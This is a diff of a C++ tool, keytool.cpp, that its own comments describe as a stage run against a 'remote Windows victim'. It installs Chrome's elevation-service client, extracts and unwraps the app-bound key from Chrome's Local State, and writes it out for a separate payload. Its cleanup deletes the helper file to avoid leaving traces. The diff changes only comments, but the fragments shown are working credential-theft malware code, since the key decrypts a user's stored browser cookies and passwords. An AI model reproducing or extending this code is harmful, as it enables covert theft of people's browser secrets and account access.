@@ -1,4 +1,4 @@
-// keytool.cpp - one-shot v20 key stage for a remote Windows victim.
+// keytool.cpp -- one-shot v20 key stage for a remote Windows victim.
 // Deploys the Chrome elevation-service client into Program Files, unwraps the
 // app-bound key for the current user, and writes mc-chrome.key for the payload.
 //
@@ -66,7 +66,7 @@ static bool write_file(const wchar_t* path, const void* data, DWORD len){
     return wrote;
 }
 
-// extract "app_bound_encrypted_key":"<base64>" from Local State
+// Extract "app_bound_encrypted_key":"<base64>" from Local State.
 static bool app_bound_blob(const char* json, DWORD len, char** b64_out, DWORD* b64_len){
     static const char key[] = "\"app_bound_encrypted_key\"";
     const DWORD key_len = (DWORD)(sizeof(key) - 1);       // 25 with both quotes
@@ -218,7 +218,7 @@ int wmain(void){
                  write_file(legacy, b64key, b64key_len);
     DeleteFileW(rawkey);
     DeleteFileW(appb);
-    DeleteFileW(helper);                       // no need to leave the client behind
+    DeleteFileW(helper);                       // No need to leave the client behind
 
     if(!wrote) return fail("cannot write mc-chrome.key");
     return ok("Chrome v20 key extracted.");
